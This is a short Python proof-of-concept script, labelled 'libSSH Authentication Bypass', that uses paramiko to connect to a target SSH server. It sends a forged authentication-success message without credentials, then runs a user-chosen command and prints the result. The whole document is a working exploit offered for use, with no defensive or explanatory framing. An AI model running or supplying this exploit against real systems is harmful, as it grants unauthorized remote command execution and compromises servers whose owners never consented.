#!/usr/bin/python3

import paramiko
import socket
import argparse
from sys import argv, exit


parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-c', '--cmd', help='Command to execute', default='ifconfig')
args = parser.parse_args()

host=args.host
port=args.port
cmd=args.cmd

s = socket.socket()
s.connect((host, port))
m = paramiko.message.Message()
t = paramiko.transport.Transport(s)
t.start_client()
m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(m)
c = t.open_session(timeout=5)
c.exec_command(cmd)
out = c.makefile("rb", 2048)
output = out.read()
out.close()
print(output)
